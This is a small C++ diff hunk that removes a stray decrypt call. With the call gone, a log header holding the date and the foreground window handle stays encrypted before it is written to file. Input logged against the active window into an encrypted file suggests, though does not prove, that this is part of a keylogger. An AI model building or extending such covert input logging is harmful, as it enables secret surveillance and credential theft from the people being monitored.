@@ -37,7 +37,6 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
 	Crypt::Encrypt(timeString);
-	Crypt::Decrypt(timeString);
 	logFile->Ofstream << timeString;
   }
   std::string cryptInput = input;
